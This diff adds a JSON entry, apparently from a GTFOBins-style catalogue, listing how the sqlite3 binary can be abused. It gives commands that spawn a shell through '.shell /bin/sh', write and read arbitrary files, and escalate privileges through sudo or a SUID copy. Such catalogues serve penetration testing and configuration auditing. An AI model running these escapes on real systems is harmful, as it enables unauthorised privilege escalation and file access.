@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "sqlite3 /dev/null '.shell /bin/sh'"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "sqlite3 /dev/null -cmd \".output [file]\" 'select \"DATA\";'\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "sqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import [file] t\nSELECT * FROM t;\nEOF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo sqlite3 /dev/null '.shell /bin/sh'"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./sqlite3 /dev/null '.shell /bin/sh'"
+      }
+    ]
+  }
+}
